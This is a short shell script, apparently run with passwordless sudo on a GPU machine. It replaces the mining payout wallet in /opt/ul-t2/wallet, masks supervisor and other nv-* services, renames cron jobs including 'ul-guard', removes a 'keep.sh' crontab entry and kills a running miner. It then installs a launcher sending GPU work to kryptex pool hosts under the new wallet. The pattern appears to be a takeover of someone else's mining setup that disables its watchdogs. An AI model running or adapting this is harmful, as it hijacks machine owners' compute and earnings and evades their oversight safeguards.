set +e
S="sudo -n"
H=$(hostname -s)
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
WRK=ul-t2-ps-149-81-10-242-g0
echo "== t2i11443 $(date -u +%FT%TZ) host=$H"
echo -n "wallet_file_before="; $S cat /opt/ul-t2/wallet 2>/dev/null; echo
$S true && echo sudo_ok || echo sudo_no
printf '%s' "$W" > /tmp/w.txt; $S install -m 644 /tmp/w.txt /opt/ul-t2/wallet
$S sh -c 'systemctl mask supervisor.service nv-cuda-cache@0.service nv-cuda-cache.service nv-t19.service >/dev/null 2>&1; for f in /etc/cron.d/nv-t19v /etc/cron.d/ul-guard /etc/cron.d/ul-nvpm; do [ -f $f ] && mv $f $f.disabled-t2; done; crontab -l 2>/dev/null | grep -v "opt/nv/keep.sh" | crontab -'
$S mv /opt/fleet/sup.sh /opt/fleet/sup.sh.disabled-t2 2>/dev/null
$S pkill -9 -f /opt/nv/peakminer
cat > /tmp/r.sh <<EOF
#!/bin/bash
exec /opt/nv/peakminer -d 0 -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -u "$W.$WRK" -p x -c pearl --no-tui
EOF
$S install -m 755 /tmp/r.sh /opt/ul-t2/pm-run.sh
$S systemctl restart ul-t2-ps0
sleep 25
echo "--log"; $S tail -12 /opt/ul-t2/logs/ps0.log | cut -c1-200
echo "--api"; curl -s -m 5 http://127.0.0.1:4068/summary | head -c 400; echo
echo "--pool"
for i in 1 2 3 4 5 6; do
  curl -s -m 20 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" | tr '{' '\n' | grep "\"worker\":\"$WRK\"" | cut -c1-320
  sleep 12
done
echo "--gpu"; nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu,power.draw --format=csv,noheader
echo done
